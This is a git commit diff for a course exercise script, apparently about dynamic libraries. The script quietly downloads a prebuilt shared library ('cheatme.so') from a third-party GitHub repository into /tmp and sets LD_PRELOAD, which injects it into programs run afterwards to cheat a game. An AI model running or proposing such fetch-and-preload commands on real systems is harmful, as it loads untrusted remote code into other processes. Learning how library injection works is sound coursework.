1254e62f176c4774d3347f6c379f633f36d5a622
Amadi <paulamadi39@gmail.com>
2022-12-12 12:29:35 -0800

    advanced commit

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://github.com/Palanii1/alx-low_level-programming/blob/main/0x18-dynamic-libraries/libinjection.so
-export LD_PRELOAD="$PWD/../libinjection.so"
+wget -q -O /tmp/cheatme.so https://github.com/rolandoquiroz/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/cheatme.so
+export LD_PRELOAD=/tmp/cheatme.so
